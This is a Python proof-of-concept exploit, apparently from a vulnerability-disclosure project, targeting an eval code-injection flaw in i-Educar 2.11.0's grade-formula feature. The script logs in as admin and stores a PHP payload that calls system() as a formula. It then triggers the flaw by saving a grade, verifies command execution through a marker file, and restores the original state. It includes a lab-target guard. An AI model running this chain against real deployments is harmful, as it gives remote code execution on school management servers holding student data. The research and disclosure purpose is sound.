#!/usr/bin/env python3
"""VULN 07 — code injection (eval) in FormulaMedia_Model_Formula::_exec().

An administrator (or any user allowed to edit grade formulas) can store a
formula such as `1;system('id > /tmp/poc07marker');0` through the legacy
`/module/FormulaMedia/edit` form. When a grade is saved, the grade-book API
recomputes the average by calling `Formula::execFormulaMedia()`, which passes
the stored formula through `replaceTokens()` and then `eval()`s it. The
attacker's PHP runs in the `ieducar-fpm` container.

The PoC drives the whole chain over HTTP: admin login, formula write, grade
save. It reads the command output from a marker file inside the local lab
container and restores the original formula, curriculum links and grade rows
afterwards.
"""

from __future__ import annotations

import html
import re
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))

from lib import credentials, evidence, http_util, lab_guard, poc_cli
from lib import lab as lab_mod  # noqa: E402

VULN = {
    "id": "07",
    "slug": "formula-media-eval-code-injection",
    "title": "Code injection (eval) in FormulaMedia_Model_Formula::_exec()",
    "product": "i-Educar",
    "affected_version": "2.11.0 (latest release, tag 2.11.0)",
    "cwe_id": "CWE-94",
    "cwe_name": "Improper Control of Generation of Code ('Code Injection')",
    "cwe_source_url": "https://cwe.mitre.org/data/definitions/94.html",
    "cwe_confidence": "high",
    "cwe_justification": (
        "The stored formula string is concatenated into a PHP code fragment and run with "
        "eval(), so attacker input changes the syntax of generated code: CWE-94. CWE-95 "
        "(eval injection) is the deprecated child entry and CWE-77/78 cover OS commands, "
        "which is only the payload used here, not the weakness itself."
    ),
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H",
    "cvss_score": 9.1,
    "endpoint": "POST /module/FormulaMedia/edit; POST /module/Avaliacao/diarioApi?resource=nota&oper=post",
    "params": ["formulaMedia", "att_value", "matricula_id", "componente_curricular_id", "etapa"],
    "precondition": "profile able to edit grade formulas (verified with admin) and save grades",
    "reported_at": "",
    "followups": [],
    "silence_days": 0,
    "status": "verified",
    "blocked_reason": "",
    "screenshots": [
        "evidence/screenshots/07-formula-media-eval-code-injection-01-marker-proof.png",
    ],
    "advisory_url": "https://github.com/pollotherunner/i-explorar/blob/main/vulns/07-formula-media-eval-code-injection/README.md",
}

ADMIN = credentials.credentials("admin")
FORMULA_ID = "3"
MARKER = "/tmp/poc07marker"
PAYLOAD = f"1;system('id > {MARKER}');0"
SEED_LINKS_SQL = (
    "INSERT INTO modules.componente_curricular_ano_escolar "
    "(componente_curricular_id, ano_escolar_id, carga_horaria, anos_letivos) "
    "VALUES (3, 6, 40, '{2026}') ON CONFLICT DO NOTHING; "
    "INSERT INTO modules.componente_curricular_turma "
    "(componente_curricular_id, ano_escolar_id, escola_id, turma_id, carga_horaria) "
    "VALUES (3, 6, 2, 3, 40) ON CONFLICT DO NOTHING;"
)
CLEANUP_SQL = (
    "DELETE FROM modules.componente_curricular_turma WHERE componente_curricular_id=3 AND turma_id=3; "
    "DELETE FROM modules.componente_curricular_ano_escolar WHERE componente_curricular_id=3 AND ano_escolar_id=6; "
    "DELETE FROM modules.nota_componente_curricular WHERE nota_aluno_id IN "
    "(SELECT id FROM modules.nota_aluno WHERE matricula_id=3); "
    "DELETE FROM modules.nota_componente_curricular_media WHERE nota_aluno_id IN "
    "(SELECT id FROM modules.nota_aluno WHERE matricula_id=3);"
)
GRADE_URL = (
    "/module/Avaliacao/diarioApi?resource=nota&oper=post"
    "&instituicao_id=1&escola_id=2&curso_id=3&serie_id=6&turma_id=3"
    "&ano=2026&ano_escolar=2026&componente_curricular_id=3&etapa=1&matricula_id=3"
)


def _compose(lab: Path, *args: str) -> list[str]:
    return lab_mod.compose(lab, *args)


def _psql(lab: Path, sql: str, *, log: evidence.EvidenceLog) -> str:
    cmd = _compose(lab, "exec", "-T", "postgres", "psql", "-U", "ieducar", "-d", "ieducar", "-tAc", sql)
    log.command(" ".join(cmd))
    proc = subprocess.run(cmd, cwd=lab, capture_output=True, text=True, timeout=120)
    output = (proc.stdout + proc.stderr).strip()
    log.block("psql output", output or "(empty)")
    return output


def _formula_from_form(text: str) -> str | None:
    match = re.search(r'name="formulaMedia"[^>]*value="([^"]*)"', text)
    return html.unescape(match.group(1)) if match else None


def run(target: str, *, verbose: bool = False) -> dict:
    lab_guard.check_target(target)

    vuln_dir = Path(__file__).resolve().parent
    lab = lab_mod.lab_dir()
    log = evidence.EvidenceLog(vuln_dir)
    notes: list[str] = []
    log.write(f"# target: {target}")

    client = http_util.HttpClient(target, verbose=verbose)
    client.login(*ADMIN)
    if not client.logged_in():
        log.close()
        return {"vulnerable": False, "evidence": [str(log.path)], "notes": "admin login failed"}

    original = None
    vulnerable = False
    try:
        edit = client.get(f"/module/FormulaMedia/edit?id={FORMULA_ID}")
        original = _formula_from_form(edit.text)
        log.write(f"# original formula id={FORMULA_ID}: {original!r}")

        write = client.post(
            f"/module/FormulaMedia/edit?id={FORMULA_ID}",
            data={
                "tipoacao": "Editar",
                "nome": "voluptas voluptas vel",
                "tipoFormula": "1",
                "instituicao": "1",
                "formulaMedia": PAYLOAD,
            },
        )
        log.write("")
        log.write("### POST /module/FormulaMedia/edit (stores the malicious formula)")
        log.write(f"HTTP {write.status}")
        confirm = client.get(f"/module/FormulaMedia/edit?id={FORMULA_ID}")
        stored = _formula_from_form(confirm.text)
        log.write(f"# formula now stored: {stored!r}")

        _psql(lab, SEED_LINKS_SQL, log=log)
        subprocess.run(_compose(lab, "exec", "-T", "fpm", "rm", "-f", MARKER), cwd=lab,
                       capture_output=True, text=True, timeout=60)

        grade = client.post(
            GRADE_URL,
            data={"att_value": "4", "nota_original": ""},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        log.write("")
        log.write("### POST grade (triggers execFormulaMedia -> eval)")
        log.write(f"HTTP {grade.status}")
        log.block("body", grade.text.strip()[:800])

        cat = subprocess.run(
            _compose(lab, "exec", "-T", "fpm", "cat", MARKER),
            cwd=lab,
            capture_output=True,
            text=True,
            timeout=60,
        )
        log.command(f"docker compose exec -T fpm cat {MARKER}")
        marker_content = (cat.stdout + cat.stderr).strip()
        log.block("marker output", marker_content or "(empty)")

        vulnerable = marker_content.startswith("uid=")
        notes.append(
            f"injected PHP executed: {marker_content}"
            if vulnerable
            else "marker file not created; eval did not run the payload"
        )
    finally:
        if original is not None:
            restore = client.post(
                f"/module/FormulaMedia/edit?id={FORMULA_ID}",
                data={
                    "tipoacao": "Editar",
                    "nome": "voluptas voluptas vel",
                    "tipoFormula": "1",
                    "instituicao": "1",
                    "formulaMedia": original,
                },
            )
            log.write("")
            log.write(f"### restore original formula ({original!r})")
            log.write(f"HTTP {restore.status}")
        subprocess.run(_compose(lab, "exec", "-T", "fpm", "rm", "-f", MARKER), cwd=lab,
                       capture_output=True, text=True, timeout=60)
        _psql(lab, CLEANUP_SQL, log=log)
        log.close()

    return {"vulnerable": vulnerable, "evidence": [str(log.path)], "notes": "; ".join(notes)}


def main(argv: list[str] | None = None) -> int:
    return poc_cli.poc_main(VULN, run, argv, __file__)


if __name__ == "__main__":
    sys.exit(main())
